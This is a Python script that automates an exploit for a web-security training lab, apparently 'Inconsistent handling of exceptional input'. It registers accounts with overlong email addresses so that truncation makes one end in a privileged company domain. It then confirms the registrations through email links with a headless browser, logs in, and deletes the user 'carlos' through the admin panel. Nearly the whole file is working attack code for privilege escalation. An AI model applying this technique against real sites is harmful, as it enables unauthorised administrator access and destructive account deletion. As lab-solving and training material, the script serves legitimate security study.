#!/usr/bin/env python3
"""
One-shot automation for “Inconsistent handling of exceptional input” lab.

Usage:
    python3 onestage.py BASE_URL YOUR_EMAIL_DOMAIN
"""
import sys, time, uuid
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} BASE_URL YOUR_EMAIL_DOMAIN")
    sys.exit(1)

BASE      = sys.argv[1].rstrip('/')
EMAIL_DOM = sys.argv[2]
PASSWORD  = "P@ssw0rd123!"

# Stage1 local length; Stage2 prefix len to land @dontwannacry.com at char 255
STAGE1_LEN      = 200
TRUNC_DOMAIN    = "@dontwannacry.com"
STAGE2_PREFIX   = 255 - len(TRUNC_DOMAIN)

sess = requests.Session()
sess.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Origin":      BASE,
})

chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")
driver = webdriver.Chrome(options=chrome_options)

def get_csrf(path):
    r = sess.get(path); r.raise_for_status()
    return BeautifulSoup(r.text, "html.parser")\
           .find("input", {"name":"csrf"})["value"]

def register(username, email):
    token = get_csrf(f"{BASE}/register")
    r = sess.post(
        f"{BASE}/register",
        data={"csrf": token, "username": username, "email": email, "password": PASSWORD},
        headers={"Referer": f"{BASE}/register"}
    )
    r.raise_for_status()
    return r.text

def poll_for_links(timeout=30):
    """Return list of all temp-registration-token URLs in arrival order."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        r = sess.get(f"https://{EMAIL_DOM}/email"); r.raise_for_status()
        links = [
            a["href"]
            for a in BeautifulSoup(r.text, "html.parser").find_all(
                "a", href=lambda h: h and "temp-registration-token=" in h
            )
        ]
        if links:
            return links
        time.sleep(1)
    print("[!] No emails arrived within timeout"); sys.exit(1)

def confirm(link):
    driver.get(link)
    # You might need to add some waits here if the page takes time to load or has JavaScript redirects
    # For example: time.sleep(5)
    # driver.quit() # Don't quit here, quit at the end of main

def login(username):
    token = get_csrf(f"{BASE}/login")
    r = sess.post(
        f"{BASE}/login",
        data={"csrf": token, "username": username, "password": PASSWORD}
    )
    r.raise_for_status()
    if "My account" not in r.text:
        print("[!] Login failed"); sys.exit(1)

def delete_carlos():
    r = sess.get(f"{BASE}/admin/delete?username=carlos"); r.raise_for_status()
    if not (r.status_code==200 and "delete" in r.text.lower()):
        print("[!] Delete failed"); sys.exit(1)

def main():
    # ─── Stage 1 ─────────────────────────────────────────────────────────
    u1    = "u" + uuid.uuid4().hex[:6]
    email1 = "A"*STAGE1_LEN + "@" + EMAIL_DOM
    print(f"[*] Stage 1 register: {u1} / {email1}")
    resp1 = register(u1, email1)
    if "Please check your emails" not in resp1:
        print("[!] Stage 1 registration didn’t hit the expected page"); sys.exit(1)
    print("[✓] Stage 1 OK — polling for first link…")
    links = poll_for_links()
    link1 = links[-1]
    print(f"[✓] Got Stage 1 link: {link1}")
    print(f"[DEBUG] BASE: {BASE}")
    print(f"[DEBUG] EMAIL_DOM: {EMAIL_DOM}")
    print(f"[DEBUG] Confirming link: {link1}")
    time.sleep(2)
    confirm(link1)
    print("[✓] Stage 1 confirmed\n")

    # ─── Stage 2 ─────────────────────────────────────────────────────────
    u2     = "evil" + uuid.uuid4().hex[:6]
    prefix = "A"*STAGE2_PREFIX
    email2 = f"{prefix}{TRUNC_DOMAIN}.{EMAIL_DOM}"
    print(f"[*] Stage 2 register: {u2} / {email2}")
    resp2 = register(u2, email2)
    if "Please check your emails" not in resp2:
        print("[!] Stage 2 registration didn’t hit the expected page"); sys.exit(1)
    print("[✓] Stage 2 OK — polling for new link…")

    # Poll until we see a link != link1
    deadline = time.time() + 30
    link2 = None
    while time.time() < deadline:
        for l in poll_for_links():
            if l != link1:
                link2 = l
                break
        if link2:
            break
        time.sleep(1)

    if not link2:
        print("[!] Stage 2 link never arrived"); sys.exit(1)

    print(f"[✓] Got Stage 2 link: {link2}")
    confirm(link2)
    print("[✓] Stage 2 confirmed\n")

    # ─── Login & Delete ───────────────────────────────────────────────────
    print(f"[*] Logging in as {u2}")
    login(u2)
    print("[✓] Logged in — deleting carlos…")
    delete_carlos()
    print("[✓] carlos deleted — lab solved!")
    driver.quit()

if __name__ == "__main__":
    main()
